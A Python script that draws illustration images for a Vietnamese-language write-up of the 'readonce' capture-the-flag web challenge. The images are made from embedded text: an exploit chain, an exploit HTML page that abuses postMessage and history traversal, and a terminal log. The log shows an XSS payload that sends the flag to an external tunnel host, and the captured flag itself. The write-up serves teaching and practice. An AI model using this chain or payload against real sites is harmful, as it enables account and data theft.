import os
from PIL import Image, ImageDraw, ImageFont

img_dir = "c:/Users/ACER/Downloads/ctf/ctf pwnsec/images"
os.makedirs(img_dir, exist_ok=True)

f_consola = ImageFont.truetype("C:/Windows/Fonts/consola.ttf", 15)
f_consolab = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 15)
f_segoe = ImageFont.truetype("C:/Windows/Fonts/segoeui.ttf", 14)
f_segoeb = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 15)
f_title = ImageFont.truetype("C:/Windows/Fonts/segoeuib.ttf", 22)
f_flag = ImageFont.truetype("C:/Windows/Fonts/consolab.ttf", 20)

def draw_browser_frame(draw, width, height, title, url):
    draw.rectangle([(0, 0), (width, 75)], fill=(24, 27, 40, 255))
    # Window controls
    draw.ellipse([(16, 16), (28, 28)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 16), (48, 28)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 16), (68, 28)], fill=(39, 201, 63, 255))
    # Tab
    draw.rounded_rectangle([(80, 10), (340, 42)], radius=6, fill=(35, 40, 58, 255))
    draw.text((100, 16), title, fill=(210, 220, 240, 255), font=f_segoe)
    # URL bar
    draw.rounded_rectangle([(16, 42), (width - 16, 70)], radius=14, fill=(16, 18, 28, 255))
    draw.text((36, 47), url, fill=(170, 180, 205, 255), font=f_segoe)

# -------------------------------------------------------------
# IMAGE 0: Challenge Overview Banner
# -------------------------------------------------------------
def make_challenge_overview(out_path):
    width = 1100
    height = 500
    img = Image.new("RGBA", (width, height), (13, 16, 26, 255))
    draw = ImageDraw.Draw(img)

    # Title header box
    draw.rectangle([(0, 0), (width, 60)], fill=(22, 27, 42, 255))
    draw.text((25, 16), "PwnSec CTF 2026 — Thử thách: readonce", fill=(240, 245, 255, 255), font=f_title)

    # Info card left
    draw.rounded_rectangle([(30, 80), (520, 470)], radius=12, fill=(20, 24, 38, 255), outline=(60, 75, 110, 255), width=1)
    draw.text((50, 100), "THÔNG TIN BÀI THI", fill=(100, 200, 255, 255), font=f_segoeb)
    
    info_items = [
        ("Tên thử thách:", "readonce"),
        ("Thể loại:", "Web Exploitation / Race Condition / State Machine"),
        ("Độ khó:", "Medium / Hard"),
        ("Tác giả:", "ANAS"),
        ("Môi trường:", "Express.js + EJS + Puppeteer Bot"),
        ("Mục tiêu:", "Bypass trạng thái review & Đọc /api/flag"),
        ("Flag:", "pwnsec{62c62c2f6d2f9a7447ee56faeb7e7b68}")
    ]
    
    y = 140
    for k, v in info_items:
        draw.text((50, y), k, fill=(160, 175, 205, 255), font=f_segoe)
        draw.text((180, y), v, fill=(240, 245, 255, 255), font=f_segoeb if k=="Flag:" else f_segoe)
        y += 45

    # Architecture Overview Right
    draw.rounded_rectangle([(540, 80), (1070, 470)], radius=12, fill=(20, 24, 38, 255), outline=(60, 75, 110, 255), width=1)
    draw.text((560, 100), "TỔNG QUAN CHUỖI KHAI THÁC", fill=(100, 200, 255, 255), font=f_segoeb)

    steps = [
        "1. Tạo Note chứa XSS script đọc /api/flag.",
        "2. Nộp URL exploit cho Bot chứa iframe gọi /review.",
        "3. Window con gửi postMessage('approve') tới /review.",
        "4. Kích hoạt POST /complete -> set approved = true.",
        "5. history.go(-2) quay lại /reports/check đọc Note HTML.",
        "6. XSS thực thi fetch('/api/flag') & exfiltrate flag."
    ]

    y = 145
    for s in steps:
        draw.text((560, y), s, fill=(210, 220, 240, 255), font=f_segoe)
        y += 48

    img.save(out_path)
    print(f"Saved: {out_path}")

# -------------------------------------------------------------
# IMAGE 1: Step 1 - State Machine Analysis
# -------------------------------------------------------------
def make_step1_state_machine(out_path):
    width = 1100
    height = 540
    img = Image.new("RGBA", (width, height), (13, 16, 26, 255))
    draw = ImageDraw.Draw(img)

    draw.rectangle([(0, 0), (width, 50)], fill=(22, 27, 42, 255))
    draw.text((25, 14), "Phân tích Logic Ma Trận Trạng Thái (State Machine Flaw) trong readonce", fill=(240, 245, 255, 255), font=f_segoeb)

    draw.rounded_rectangle([(40, 70), (1060, 490)], radius=10, fill=(18, 22, 34, 255), outline=(60, 75, 110, 255), width=1)

    lines = [
        ("// Điều kiện để /reports/check render ghi chú (render review-document):", (140, 155, 185, 255), False),
        ("function consumeReport(req) {", (200, 210, 230, 255), False),
        ("  return currentReview && currentReview.prepared && currentReview.approved && !currentReview.used;", (100, 240, 150, 255), True),
        ("}", (200, 210, 230, 255), False),
        ("", (0,0,0,0), False),
        ("// 📌 HÀNH TRÌNH CHUYỂN ĐỔI TRẠNG THÁI (STATE TRANSITIONS):", (255, 220, 100, 255), True),
        ("1. Bot gọi /reports/check?rid=... (Lần 1)  ---> set currentReview.visited = true", (210, 220, 240, 255), False),
        ("2. Bot gọi /reports/arm/:id                 ---> set currentReview.prepared = true", (210, 220, 240, 255), False),
        ("3. Bot mở URL người chơi cung cấp (/exploit)", (210, 220, 240, 255), False),
        ("4. Trang /exploit mở popup /review?rid=...  ---> Nạp /sandbox?rid=...", (210, 220, 240, 255), False),
        ("5. Event message gửi từ window con         ---> POST /complete  ---> set currentReview.approved = true!", (34, 197, 94, 255), True),
        ("6. Trang /exploit gọi history.go(-2)         ---> Quay lại /reports/check (Lần 2)", (255, 220, 100, 255), True),
        ("7. /reports/check thấy visited=true + prepared=true + approved=true + !used", (80, 240, 120, 255), True),
        ("   ===> SERVER RENDER THẺ HTML CỦA NOTE CHỨA XSS! MÃ XSS ĐỌC FLAG VÀ GỬI VỀ WEBHOOK!", (255, 100, 100, 255), True)
    ]

    y = 85
    for text, color, is_b in lines:
        if text:
            draw.text((60, y), text, fill=color, font=f_consolab if is_b else f_consola)
        y += 25

    img.save(out_path)
    print(f"Saved: {out_path}")

# -------------------------------------------------------------
# IMAGE 2: Step 2 - Exploit HTML Page Construction
# -------------------------------------------------------------
def make_step2_exploit_html(out_path):
    width = 1100
    height = 540
    img = Image.new("RGBA", (width, height), (13, 16, 26, 255))
    draw = ImageDraw.Draw(img)

    draw.rectangle([(0, 0), (width, 50)], fill=(22, 27, 42, 255))
    draw.text((25, 14), "Cấu trúc Trang /exploit kích hoạt Cross-Window Message & History Traversal", fill=(240, 245, 255, 255), font=f_segoeb)

    draw.rounded_rectangle([(40, 70), (1060, 490)], radius=10, fill=(18, 22, 34, 255), outline=(60, 75, 110, 255), width=1)

    code = [
        "<!DOCTYPE html>",
        "<html>",
        "<body>",
        "  <script>",
        "    const params = new URLSearchParams(location.search);",
        "    const rid = params.get('rid');",
        "    const targetOrigin = 'https://12ac6d1fa0af1811.chal.ctf.ae';",
        "    const u = location.origin + '/empty.js';",
        "    const reviewUrl = `${targetOrigin}/review?rid=${encodeURIComponent(rid)}&u=${encodeURIComponent(u)}`;",
        "",
        "    // 1. Mở cửa sổ popup /review",
        "    const w = window.open(reviewUrl);",
        "",
        "    // 2. Liên tục bắn postMessage('approve') tới cửa sổ review",
        "    const timer = setInterval(() => {",
        "      if (w) { try { w.postMessage('approve', '*'); } catch(e) {} }",
        "    }, 100);",
        "",
        "    // 3. Sau 2.5 giây, quay lại lịch sử 2 bước (quay về /reports/check)",
        "    setTimeout(() => {",
        "      clearInterval(timer);",
        "      history.go(-2);",
        "    }, 2500);",
        "  </script>",
        "</body>",
        "</html>"
    ]

    y = 85
    for cl in code:
        draw.text((60, y), cl, fill=(180, 220, 250, 255), font=f_consola)
        y += 20

    img.save(out_path)
    print(f"Saved: {out_path}")

# -------------------------------------------------------------
# IMAGE 3: Step 3 - Terminal Exploit Output & Flag
# -------------------------------------------------------------
def make_step3_terminal(out_path):
    width = 1100
    height = 540
    img = Image.new("RGBA", (width, height), (12, 14, 22, 255))
    draw = ImageDraw.Draw(img)

    draw.rectangle([(0, 0), (width, 42)], fill=(24, 28, 42, 255))
    draw.ellipse([(16, 15), (28, 27)], fill=(255, 95, 86, 255))
    draw.ellipse([(36, 15), (48, 27)], fill=(255, 189, 46, 255))
    draw.ellipse([(56, 15), (68, 27)], fill=(39, 201, 63, 255))
    draw.text((85, 12), "Terminal — python scripts_dev/solve_readonce.py", fill=(210, 220, 240, 255), font=f_segoeb)

    term_lines = [
        ("$ python scripts_dev/solve_readonce.py", (255, 255, 255, 255), True),
        ("[*] Local HTTP server listening on port 8000", (170, 185, 215, 255), False),
        ("[*] Starting ssh tunnel to localhost.run...", (170, 185, 215, 255), False),
        ("[+] TUNNEL ESTABLISHED: https://a9b8eb6a7c49cd.lhr.life", (39, 201, 63, 255), True),
        ("[*] Note HTML payload (len=118): <script>fetch('/api/flag').then(r=>r.json()).then(d=>location='//a9b8eb6a7c49cd.lhr.life/f?f='+d.flag)</script>", (255, 220, 100, 255), False),
        ("[+] Created Note ID: 5a36bcff6696b0147eb6", (100, 200, 255, 255), False),
        ("[*] Submitting report URL to bot: https://a9b8eb6a7c49cd.lhr.life/exploit?note=5a36bcff6696b0147eb6", (170, 185, 215, 255), False),
        ("[HTTP] GET /exploit", (180, 220, 250, 255), False),
        ("[HTTP] GET /empty.js", (180, 220, 250, 255), False),
        ("", (0,0,0,0), False),
        ("==========================================================================", (100, 200, 255, 255), True),
        ("[+] HIT ON FLAG ENDPOINT: pwnsec{62c62c2f6d2f9a7447ee56faeb7e7b68}", (80, 240, 120, 255), True),
        ("==========================================================================", (100, 200, 255, 255), True),
        ("[*] Report response: 200 in 16.92s", (170, 185, 215, 255), False),
        ("[SUCCESS] FLAG: pwnsec{62c62c2f6d2f9a7447ee56faeb7e7b68}", (255, 255, 100, 255), True)
    ]

    y = 60
    for text, color, is_b in term_lines:
        if text:
            draw.text((28, y), text, fill=color, font=f_consolab if is_b else f_consola)
        y += 28

    img.save(out_path)
    print(f"Saved: {out_path}")

if __name__ == "__main__":
    make_challenge_overview(f"{img_dir}/readonce_challenge.png")
    make_step1_state_machine(f"{img_dir}/step1_readonce_state_machine.png")
    make_step2_exploit_html(f"{img_dir}/step2_readonce_exploit_html.png")
    make_step3_terminal(f"{img_dir}/step3_readonce_terminal.png")
    print("All readonce step images generated!")
